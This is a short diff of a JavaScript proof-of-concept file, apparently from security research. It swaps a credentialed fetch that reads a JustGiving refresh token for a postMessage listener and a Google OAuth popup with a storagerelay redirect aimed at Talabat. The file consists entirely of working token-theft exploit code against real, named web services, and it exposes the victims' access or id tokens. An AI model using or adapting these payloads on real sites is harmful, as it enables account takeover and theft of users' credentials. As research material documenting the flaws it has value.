@@ -1,11 +1,2 @@
-fetch('https://iam-api.justgiving.com/account/refresh-access-token', {
- 	credentials: 'include',
-    method: 'POST',
-    headers: {
-        'Accept': 'application/json',
-        'Content-Type': 'application/json'
-    },
-    body: JSON.stringify({"GrantType":"refresh_token","ClientId":"jg.web"})
-})
-.then(response => response.json())
-.then(response => alert("Your Token is " + JSON.stringify(response)))
+addEventListener("message",function(e){alert("victim Token"+e.data.toString());})
+window.open("https://accounts.google.com/o/oauth2/auth/oauthchooseaccount?redirect_uri=storagerelay%3A%2F%2Fhttps%2Fwww.talabat.com%3Fid%3Dauth191386&response_type=permission%20id_token&scope=email%20profile%20openid%20https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fuserinfo.profile%20https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fuserinfo.email&openid.realm&include_granted_scopes=true&client_id=1032961477997-irlg83ld7gbrjeuhsgo8q261or06a183&ss_domain=https%3A%2F%2Fwww.talabat.com&fetch_basic_profile=true&gsiwebsdk=2&service=lso&o2v=1&flowName=GeneralOAuthFlow")
